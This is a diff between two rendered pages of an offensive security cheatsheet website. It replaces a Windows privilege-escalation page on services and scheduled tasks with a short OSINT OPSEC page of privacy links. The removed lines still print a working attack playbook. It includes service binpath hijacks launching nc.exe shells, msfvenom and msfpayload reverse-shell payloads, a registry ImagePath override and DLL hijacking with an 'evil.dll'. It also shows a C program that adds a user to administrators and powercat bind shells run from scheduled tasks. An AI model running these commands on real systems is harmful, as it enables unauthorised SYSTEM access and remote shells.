@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2020-08-20T15:40:56 CEST">
-<title>Services &amp; Scheduled Tasks :: Offensive Security Cheatsheet</title>
+<title>OPSEC :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/windows-systems/privilege-escalation/services_scheduled_tasks/">
+  <body data-url="/open-source-intelligence-osint/tools-and-methodology/opsec/">
     
       <header>
   <div class="logo">
@@ -61,16 +61,18 @@
             <i class="fa fa-fw fa-home"></i>
           </a>
           </li>
-    <li data-nav-id="/open-source-intelligence-osint/" class="dd-item haschildren
+    <li data-nav-id="/open-source-intelligence-osint/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/open-source-intelligence-osint/">Open Source Intelligence (OSINT)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/open-source-intelligence-osint/">Open Source Intelligence (OSINT)</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-    <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/" class="dd-item haschildren
+    <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/open-source-intelligence-osint/tools-and-methodology/">Tools &amp; Methodology</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/open-source-intelligence-osint/tools-and-methodology/">Tools &amp; Methodology</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/methodology/" class="dd-item">
@@ -80,7 +82,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/opsec/" class="dd-item">
+      <li data-nav-id="/open-source-intelligence-osint/tools-and-methodology/opsec/" class="dd-item active">
         <div>
           <a href="/open-source-intelligence-osint/tools-and-methodology/opsec/">
             OPSEC
@@ -1078,11 +1080,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/windows-systems/" class="dd-item parent haschildren
+    <li data-nav-id="/windows-systems/" class="dd-item haschildren
         ">
       <div>
-      <a href="/windows-systems/">Windows Systems</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/windows-systems/">Windows Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
     <li data-nav-id="/windows-systems/network-and-domain-recon/" class="dd-item haschildren
@@ -1207,11 +1208,10 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item parent haschildren
+    <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item haschildren
         ">
       <div>
-      <a href="/windows-systems/privilege-escalation/">Privilege Escalation</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/windows-systems/privilege-escalation/">Privilege Escalation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/windows-systems/privilege-escalation/automated_recon/" class="dd-item">
@@ -1228,7 +1228,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/windows-systems/privilege-escalation/services_scheduled_tasks/" class="dd-item active">
+      <li data-nav-id="/windows-systems/privilege-escalation/services_scheduled_tasks/" class="dd-item">
         <div>
           <a href="/windows-systems/privilege-escalation/services_scheduled_tasks/">
             Services &amp; Scheduled Tasks
@@ -1658,7 +1658,34 @@
         <select onchange="javascript:location.href = this.value;">
           
     <option value="/open-source-intelligence-osint/" >
-   Open Source Intelligence (OSINT)</option>
+   Open Source Intelligence (OSINT)</option> 
+    <option value="/open-source-intelligence-osint/tools-and-methodology/" >
+  - 
+   Tools &amp; Methodology</option> 
+      <option value="/open-source-intelligence-osint/tools-and-methodology/methodology/" >-- Methodology</option>
+      <option value="/open-source-intelligence-osint/tools-and-methodology/opsec/"  selected>-- OPSEC</option>
+      <option value="/open-source-intelligence-osint/tools-and-methodology/firefox_addons/" >-- Firefox addons</option>
+      <option value="/open-source-intelligence-osint/tools-and-methodology/buscador/" >-- Buscador</option>
+    <option value="/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/" >
+  -- 
+   Frameworks</option>
+  
+    <option value="/open-source-intelligence-osint/dorks/" >
+  - 
+   Dorks</option>
+    <option value="/open-source-intelligence-osint/technical-recon/" >
+  - 
+   Technical Investigation</option>
+    <option value="/open-source-intelligence-osint/company_investigations/" >
+  - 
+   Company Investigations</option>
+    <option value="/open-source-intelligence-osint/human-recon/" >
+  - 
+   Human Investigation</option>
+    <option value="/open-source-intelligence-osint/platforms-hunting/" >
+  - 
+   Platforms Hunting</option>
+  
     <option value="/web-pentest/" >
    Web Pentest</option>
     <option value="/network/" >
@@ -1666,34 +1693,7 @@
     <option value="/shells-methods/" >
    Shells methods</option>
     <option value="/windows-systems/" >
-   Windows Systems</option> 
-    <option value="/windows-systems/network-and-domain-recon/" >
-  - 
-   Network and Domain Recon</option>
-    <option value="/windows-systems/local-and-physical/" >
-  - 
-   Local and Physical</option>
-    <option value="/windows-systems/exploitation/" >
-  - 
-   Exploitation</option>
-    <option value="/windows-systems/privilege-escalation/" >
-  - 
-   Privilege Escalation</option> 
-      <option value="/windows-systems/privilege-escalation/automated_recon/" >-- Automated Recon</option>
-      <option value="/windows-systems/privilege-escalation/tricks/" >-- Tricks</option>
-      <option value="/windows-systems/privilege-escalation/services_scheduled_tasks/"  selected>-- Services &amp; Scheduled Tasks</option>
-      <option value="/windows-systems/privilege-escalation/lsass_mimikatz/" >-- LSASS and Mimikatz</option>
-      <option value="/windows-systems/privilege-escalation/admin_processes/" >-- Admin and Processes</option>
-      <option value="/windows-systems/privilege-escalation/dnsadmins_group/" >-- DNSadmins group</option>
-      <option value="/windows-systems/privilege-escalation/delegations/" >-- Active Directory Delegations</option>
-      <option value="/windows-systems/privilege-escalation/privexchange/" >-- PrivExchange</option>
-      <option value="/windows-systems/privilege-escalation/windows_defender/" >-- Windows Defender</option>
-      <option value="/windows-systems/privilege-escalation/azure_ad/" >-- Azure AD</option>
-  
-    <option value="/windows-systems/post-exploitation-techniques/" >
-  - 
-   Post Exploitation Techniques</option>
-  
+   Windows Systems</option>
     <option value="/linux-systems/" >
    Linux Systems</option>
     <option value="/other-systems/" >
@@ -1732,171 +1732,47 @@
       </div>
     
 
-    <h1>Services &amp; Scheduled Tasks</h1>
+    <h1>OPSEC</h1>
     
     
     
     
 
-<h3 id="services">Services</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Query one service</span>
-sc qc Spooler
+<p>[WIP]</p>
 
-<span style="color:#75715e"># Check permissions</span>
-accesschk.exe -ucqv Spooler
+<h3 id="technical-opsec">Technical OPSEC</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Simple data analysis (headers, OS...)</span>
+https://amiunique.org/fp
 
-C:<span style="color:#8045ff">\&gt;</span> accesschk.exe -uwcqv <span style="color:#d88200">&#34;Authenticated Users&#34;</span> *
-RW SSDPSRV
-        SERVICE_ALL_ACCESS
-RW upnphost
-        SERVICE_ALL_ACCESS
+<span style="color:#75715e"># Creating profile pictures for sock</span>
+<span style="color:#75715e"># Mixing two pictures</span>
+https://twitter.com/OSINTgeek/status/1258857825868156930?s<span style="color:#f92672">=</span><span style="color:#ae81ff">19</span>
+https://www.artbreeder.com/
 
-accesschk.exe -ucqv SSDPSRV
-accesschk.exe -ucqv upnphost
+<span style="color:#75715e"># Email providers comparison</span>
+https://www.privacytools.io/providers/email/
 
-<span style="color:#75715e"># Search for specific service (looking for write permissions)</span>
-sc qc upnphost
+<span style="color:#75715e"># Compilation of great ressources</span>
+https://shutuptrackers.com/index.php
 
-<span style="color:#75715e"># Following rights can give a SYSTEM shell</span>
-SERVICE_CHANGE_CONFIG <span style="color:#f92672">(</span>Can reconfigure the service binary<span style="color:#f92672">)</span>
-WRITE_DAC <span style="color:#f92672">(</span>Can reconfigure permissions, leading to <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span>
-WRITE_OWNER <span style="color:#f92672">(</span>Can become owner and reconfigure permissions<span style="color:#f92672">)</span>
-GENERIC_WRITE <span style="color:#f92672">(</span>Inherits SERVICE_CHANGE_CONFIG<span style="color:#f92672">)</span>
-GENERIC_ALL <span style="color:#f92672">(</span>Inherits SERVICE_CHANGE_CONFIG<span style="color:#f92672">)</span>
-
-<span style="color:#75715e"># Exploit a vulnerable service (or adding new user)</span>
-sc config upnphost <span style="color:#111">binpath</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
-sc config upnphost <span style="color:#111">obj</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;.\LocalSystem&#34;</span> <span style="color:#111">password</span><span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
-sc qc upnphost
-net start upnphost
-
-<span style="color:#75715e"># You can use subinacl.exe to check vulnerable service permissions</span>
-subinacl.exe /keyreg <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&#34;</span> /display
-
-<span style="color:#75715e"># If you have full control over a registry key, you can override it</span>
-msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o Payload.exe
-reg add <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service&#34;</span> /t REG_EXPAND_SZ /v ImagePath /d <span style="color:#d88200">&#34;C:\Users\testuser\AppData\Local\Temp\Payload.exe&#34;</span> /f
-shutdown /r /t <span style="color:#ae81ff">0</span>
-
-<span style="color:#75715e"># MSF module</span>
-exploit/windows/local/service_permissions
-
-<span style="color:#75715e"># Exploiting service with write permissions</span>
-<span style="color:#75715e"># You want to have (F) or (C) rights</span>
-C:<span style="color:#8045ff">\p</span>ath<span style="color:#8045ff">\t</span>o<span style="color:#8045ff">\f</span>ile.exe 
-BUILTIN<span style="color:#8045ff">\U</span>sers:F
-BUILTIN<span style="color:#8045ff">\P</span>ower Users:C 
-BUILTIN<span style="color:#8045ff">\A</span>dministrators:F 
-NT AUTHORITY<span style="color:#8045ff">\S</span>YSTEM:F
-
-<span style="color:#75715e"># Then you can add your own binary</span>
-<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
-int main <span style="color:#f92672">()</span>
-<span style="color:#f92672">{</span>
-int i<span style="color:#111">;</span>
-    <span style="color:#111">i</span> <span style="color:#f92672">=</span> system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;net localgroup administrators theusername /add&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
-<span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
-<span style="color:#f92672">}</span>
-
-<span style="color:#75715e"># Compile it</span>
-i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
-
-<span style="color:#75715e"># And restart the service</span>
-wmic service NAMEOFSERVICE call startservice
-net stop <span style="color:#f92672">[</span>service name<span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> net start <span style="color:#f92672">[</span>service name<span style="color:#f92672">]</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">echo</span> %path%
-
-<span style="color:#75715e"># Check permissions for a service in PAth</span>
-accesschk.exe -dqv <span style="color:#d88200">&#34;C:\Python27&#34;</span>
-cacls <span style="color:#d88200">&#34;C:\Python27&#34;</span>
-
-<span style="color:#75715e"># Need to check the IKEEXT service</span>
-sc qc IKEEXT
-
-<span style="color:#75715e"># If all conditions are met, you can craft a shell</span>
-msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> O
-msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> D &gt; 
-/root/Desktop/evil.dll
-
-<span style="color:#75715e"># Then upload it and rename it</span>
-copy evil.dll C:<span style="color:#8045ff">\P</span>ython27<span style="color:#8045ff">\w</span>lbsctrl.dll
-dir C:<span style="color:#8045ff">\P</span>ython27
-
-<span style="color:#75715e"># Then system reboot</span>
-
-<span style="color:#75715e"># DLL Hijacking other methods</span>
-msf&gt; search -f Vulnerable.exe
-msf&gt; download Vulnerable.exe
-
-<span style="color:#75715e"># You can use procmon to check missing DLL (add Process Name, Result, Name)</span>
-<span style="color:#75715e"># Then</span> 
-msf&gt; search -f hijackable.dll</code></pre></div>
+<span style="color:#75715e"># Windows 10 Tracking</span>
+https://github.com/10se1ucgo/DisableWinTracking</code></pre></div>
 <p><br/></p>
 
-<h3 id="scheduled-tasks">Scheduled Tasks</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Scheduled Tasks</span>
-<span style="color:#75715e"># For example, a TFTP server</span>
-Task To Run: E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\t</span>ftp.exe <span style="color:#ae81ff">10</span>.1.1.99 GET log.out E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\L</span>ogs<span style="color:#8045ff">\l</span>og.txt
-
-<span style="color:#75715e"># Check rights for the folder</span>
-accesschk.exe -dqv <span style="color:#d88200">&#34;E:\GrabLogs&#34;</span>
-dir <span style="color:#d88200">&#34;E:\GrabLogs&#34;</span>
-
-<span style="color:#75715e"># If running as SYSTEM and write permissions for users, you can craft a payload</span>
-msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> O
-msfpayload windows/shell_reverse_tcp <span style="color:#111">lhost</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;127.0.0.1&#39;</span> <span style="color:#111">lport</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;9988&#39;</span> R <span style="color:#111">|</span> msfencode -t
-exe &gt; /root/Desktop/evil-tftp.exe
-
-<span style="color:#75715e"># Then copy payload</span>
-copy evil-tftp.exe E:<span style="color:#8045ff">\G</span>rabLogs<span style="color:#8045ff">\t</span>ftp.exe</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI</span>
-<span style="color:#75715e"># pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag</span>
-<span style="color:#75715e"># to automatically accept the EULA.</span>
-accesschk.exe /accepteula ... ... ...
-
-<span style="color:#75715e"># Find all weak folder permissions per drive.</span>
-accesschk.exe -uwdqs Users c:<span style="color:#8045ff">\
-</span><span style="color:#8045ff"></span>accesschk.exe -uwdqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\
-</span><span style="color:#8045ff"></span>
-<span style="color:#75715e"># Find all weak file permissions per drive.</span>
-accesschk.exe -uwqs Users c:<span style="color:#8045ff">\*</span>.*
-accesschk.exe -uwqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\*</span>.*</code></pre></div>
-<p><br/></p>
-
-<h3 id="get-local-privileges-back">Get Local Privileges back</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># From https://itm4n.github.io/localservice-privileges/</span>
-
-<span style="color:#75715e"># Create a scheduled task</span>
-PS&gt; <span style="color:#111">$TaskAction</span> <span style="color:#f92672">=</span> New-ScheduledTaskAction -Execute <span style="color:#d88200">&#34;powershell.exe&#34;</span> -Argument <span style="color:#d88200">&#34;-Exec Bypass -Command `&#34;</span>. C:<span style="color:#8045ff">\T</span>OOLS<span style="color:#8045ff">\p</span>owercat.ps1<span style="color:#111">;</span> powercat -l -p <span style="color:#ae81ff">7002</span> -ep<span style="color:#d88200">`</span><span style="color:#d88200">&#34;&#34;</span>
-PS&gt; Register-ScheduledTask -Action <span style="color:#111">$TaskAction</span> -TaskName <span style="color:#d88200">&#34;SomeTask&#34;</span>
-PS&gt; Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask&#34;</span>
-
-<span style="color:#75715e"># Then connect to the bind shell</span>
-. .<span style="color:#8045ff">\p</span>owercat.ps1
-powercat -c <span style="color:#ae81ff">127</span>.0.0.1 -p <span style="color:#ae81ff">7002</span>
-
----------------
-
-<span style="color:#75715e"># In order to get the SeImpersonatePrivilege back, you need to specify it clearly</span>
-<span style="color:#75715e"># Create a list of privileges</span> 
-<span style="color:#f92672">[</span>System.String<span style="color:#f92672">[]]</span><span style="color:#111">$Privs</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SeAssignPrimaryTokenPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeAuditPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeChangeNotifyPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeCreateGlobalPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeImpersonatePrivilege&#34;</span>, <span style="color:#d88200">&#34;SeIncreaseQuotaPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeShutdownPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeUndockPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeIncreaseWorkingSetPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeTimeZonePrivilege&#34;</span>
-
-<span style="color:#75715e"># Create a Principal for the task</span> 
-<span style="color:#111">$TaskPrincipal</span> <span style="color:#f92672">=</span> New-ScheduledTaskPrincipal -UserId <span style="color:#d88200">&#34;LOCALSERVICE&#34;</span> -LogonType ServiceAccount -RequiredPrivilege <span style="color:#111">$Privs</span>
-
-<span style="color:#75715e"># Create an action for the task</span> 
-<span style="color:#111">$TaskAction</span> <span style="color:#f92672">=</span> New-ScheduledTaskAction -Execute <span style="color:#d88200">&#34;powershell.exe&#34;</span> -Argument <span style="color:#d88200">&#34;-Exec Bypass -Command `&#34;</span>. C:<span style="color:#8045ff">\T</span>OOLS<span style="color:#8045ff">\p</span>owercat.ps1<span style="color:#111">;</span> powercat -l -p <span style="color:#ae81ff">7003</span> -ep<span style="color:#d88200">`</span><span style="color:#d88200">&#34;&#34;</span>
-<span style="color:#75715e"># Create the task</span>
-Register-ScheduledTask -Action <span style="color:#111">$TaskAction</span> -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</span> -Principal <span style="color:#111">$TaskPrincipal</span>
-<span style="color:#75715e"># Start the task</span>
-Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</span></code></pre></div>
-<p><br/></p>
-
+<h3 id="human-related-opsec">Human Related OPSEC</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Image Cloaking for Personal Privacy</span>
+<span style="color:#75715e"># Fawkes takes your personal images and makes tiny, pixel-level changes that are invisible to the human eye</span>
+<span style="color:#75715e"># if and when someone tries to use these photos to build a facial recognition model</span>
+<span style="color:#75715e"># &#34;cloaked&#34; images will teach the model an highly distorted version of what makes you look like you</span>
+http://sandlab.cs.uchicago.edu/fawkes/</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Lycamobile can be used to get a Burner SIM / phone number</span>
+https://www.lycamobile.fr/fr/</code></pre></div>
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/windows-systems/privilege-escalation/tricks/" title="Tricks"> <i class="fa fa-chevron-left"></i><label>Tricks</label></a>
-    <a class="nav nav-next" href="/windows-systems/privilege-escalation/lsass_mimikatz/" title="LSASS and Mimikatz" style="margin-right: 0px;"><label>LSASS and Mimikatz</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/open-source-intelligence-osint/tools-and-methodology/methodology/" title="Methodology"> <i class="fa fa-chevron-left"></i><label>Methodology</label></a>
+    <a class="nav nav-next" href="/open-source-intelligence-osint/tools-and-methodology/firefox_addons/" title="Firefox addons" style="margin-right: 0px;"><label>Firefox addons</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -1913,7 +1789,7 @@ Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</s
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Windows%20Systems/Privilege%20Escalation/Services_Scheduled_Tasks.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Open%20Source%20Intelligence%20%28OSINT%29/Tools%20and%20Methodology/OPSEC.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
